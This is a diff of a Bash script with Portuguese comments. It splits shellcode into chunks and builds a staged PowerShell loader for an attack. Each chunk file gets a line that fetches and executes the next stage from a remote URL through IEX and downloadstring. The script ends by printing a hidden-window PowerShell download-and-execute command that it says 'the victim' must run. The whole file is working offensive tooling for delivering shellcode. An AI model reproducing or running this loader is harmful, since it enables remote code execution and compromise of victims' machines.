@@ -82,6 +82,9 @@ parte=$(expr $total / $numero)
 acumulador=1
 currentFile=$parte
 
+echo "O shellcode será divido a cada $parte bytes.."
+echo ""
+
 # Percorre byte a byte o shellcode
 for index in "${!array[@]}"
 do		
@@ -96,26 +99,29 @@ do
 			# Finaliza arquivo do shellcode 
 			echo "${array[index]}" >> tmp/t$acumulador.txt	
 			cat tmp/t$acumulador.txt | paste -sd "" > tmp/s$acumulador.txt 
-			rm tmp/t$acumulador.txt		
+			rm tmp/t$acumulador.txt	
+			echo "Último arquivo do shellcode tmp/s$acumulador.txt criado..."		
+			echo ""
 			
 			# Manda carregar o script final
 			echo "Start-Sleep -milliseconds $timeout" >> tmp/s$acumulador.txt
 			echo "IEX((new-object net.webclient).downloadstring('$url_base""last1.txt'));" >> tmp/s$acumulador.txt		
 		else	
 			# Se o próximo byte dizer parte desse mesmo arquivo
-			if [ $nextIndex -lt $currentFile ];
-			then				
+			#if [ $nextIndex -lt $currentFile ];
+			#then				
 				echo "${array[index]}," >> tmp/t$acumulador.txt
-			else
-				echo "${array[index]}" >> tmp/t$acumulador.txt
-			fi
+			#else
+				#echo "${array[index]}" >> tmp/t$acumulador.txt				
+			#fi
 			
 		fi
 	else			
 		# Finaliza arquivo do shellcode
 		novo_aculumador=$(expr $acumulador \+ 1)				
-		cat tmp/t$acumulador.txt | paste -sd "" > tmp/s$acumulador.txt 		
+		cat tmp/t$acumulador.txt | paste -sd "" | sed 's/\(.*\),/\1 /' > tmp/s$acumulador.txt 		
 		rm tmp/t$acumulador.txt 
+		echo "Arquivo tmp/s$acumulador.txt criado..."		
 		
 		# Manda carregar o próximo arquivo
 		echo "Start-Sleep -milliseconds $timeout" >> tmp/s$acumulador.txt
@@ -150,7 +156,6 @@ echo "A vitima deve executar o seguinte comando: "
 printf "${RED}powershell -nop -noe -W hidden -C \"IEX((new-object net.webclient).downloadstring('$url'));\"${NC}"
 
 rm tmp/shellcode
-
 
 
 
